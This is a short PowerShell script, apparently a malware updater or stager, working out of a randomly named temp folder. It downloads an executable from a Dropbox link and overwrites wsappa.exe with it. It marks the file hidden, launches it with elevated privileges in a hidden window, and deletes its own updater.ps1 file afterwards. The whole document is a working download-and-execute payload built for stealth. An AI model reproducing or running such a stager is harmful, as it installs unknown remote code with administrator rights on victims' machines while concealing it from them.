#sleep
start-sleep 10

#change directory
cd $env:temp/sVBXKuz

#download new file
Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/p5ifhyuv4p1ui2ecolmoz/wsappa-1.6.exe?rlkey=duuxz6c3b7168p2r6iu3ozjaw&dl=0" -OutFile wsappa_new.exe
Copy-Item -Path .\wsappa_new.exe -Destination .\wsappa.exe -Force

#delete old file
Remove-Item .\wsappa_new.exe


#sleep
start-sleep 2


# Set "Hidden" attribute on the file
$filePath = Join-Path $env:temp\sVBXKuz "wsappa.exe"
$attr = [System.IO.FileAttributes]::Hidden
[System.IO.File]::SetAttributes($filePath, $attr)

#start new file
Start-Process -FilePath "$env:temp/sVBXKuz/wsappa.exe" -Verb RunAs -WindowStyle Hidden



#sleep
start-sleep 2

#clean uo
powershell.exe /c Remove-Item $env:temp/sVBXKuz/updater.ps1
